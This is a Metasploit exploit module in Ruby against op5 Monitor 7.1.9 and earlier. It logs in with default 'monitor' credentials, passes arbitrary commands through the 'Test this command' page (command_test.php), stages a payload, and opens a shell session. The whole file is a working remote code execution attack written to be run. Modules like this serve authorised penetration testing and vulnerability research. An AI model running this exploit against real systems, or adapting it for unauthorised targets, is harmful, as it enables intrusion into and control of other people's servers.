## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
 
  Rank = ExcellentRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;        => &#039;op5 v7.1.9 Configuration Command Execution&#039;,
        &#039;Description&#039; => %q(
          op5 an open source network monitoring software.
          The configuration page in version 7.1.9 and below
          allows the ability to test a system command, which
          can be abused to run arbitrary code as an unpriv user.
        ),
        &#039;Author&#039;      =>
          [
            &#039;h00die <mike@shorebreaksecurity.com>&#039;, # module
            &#039;hyp3rlinx&#039;                        # discovery
          ],
        &#039;References&#039;  =>
          [
            [ &#039;EDB&#039;, &#039;39676&#039; ],
            [ &#039;URL&#039;, &#039;https://www.op5.com/blog/news/op5-monitor-7-2-0-release-notes/&#039;]
          ],
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Platform&#039;       => [&#039;linux&#039;, &#039;unix&#039;],
        &#039;Privileged&#039;     => false,
        &#039;DefaultOptions&#039; => { &#039;SSL&#039; => true },
        &#039;Targets&#039;        =>
          [
            [ &#039;Automatic Target&#039;, {}]
          ],
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => &#039;Apr 08 2016&#039;
      )
    )
 
    register_options(
      [
        Opt::RPORT(443),
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;User to login with&#039;, &#039;monitor&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Password to login with&#039;, &#039;monitor&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to the application&#039;, &#039;/&#039;])
      ], self.class
    )
  end
 
  def check
    begin
      res = send_request_cgi(
        &#039;uri&#039;       => normalize_uri(target_uri.path),
        &#039;method&#039;    => &#039;GET&#039;
      )
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
      /Version: (?<version>[\d]{1,2}\.[\d]{1,2}\.[\d]{1,2})[\s]+\|/ =~ res.body
 
      if version && Gem::Version.new(version) <= Gem::Version.new(&#039;7.1.9&#039;)
        vprint_good("Version Detected: #{version}")
        Exploit::CheckCode::Appears
      else
        Exploit::CheckCode::Safe
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
 
  def exploit
    execute_cmdstager(
      :flavor  => :echo
    )
  end
 
  def execute_command(cmd, opts)
    begin
      # To manually view the vuln page, click Manage > Configure > Commands.
      # Click the "Test this command" button to display the form we abuse.
 
      # login
      res = send_request_cgi(
        &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;monitor/index.php/auth/login&#039;),
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_get&#039;  =>
        {
          &#039;uri&#039; => &#039;tac/index&#039;
        },
        &#039;vars_post&#039; =>
        {
          &#039;csrf_token&#039; => &#039;&#039;,
          &#039;username&#039;   => datastore[&#039;USERNAME&#039;],
          &#039;password&#039;   => datastore[&#039;PASSWORD&#039;]
        }
      )
 
      fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") if res.code != 302
      cookie = res.get_cookies
      # exploit
      res = send_request_cgi(
        &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;monitor/op5/nacoma/command_test.php&#039;),
        &#039;method&#039;    => &#039;GET&#039;,
        &#039;cookie&#039;    => cookie,
        &#039;vars_get&#039;  =>
        {
          &#039;cmd_str&#039; => cmd
        }
      )
 
      # success means we hang our session, and wont get back a response
      if res
        fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
        fail_with(Failure::UnexpectedReply, "#{peer} - Credentials need additional privileges") if res.body =~ /Access Denied/
      end
 
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
 
  def on_new_session(session)
    super
    session.shell_command_token(&#039;setsid $SHELL&#039;)
  end
end

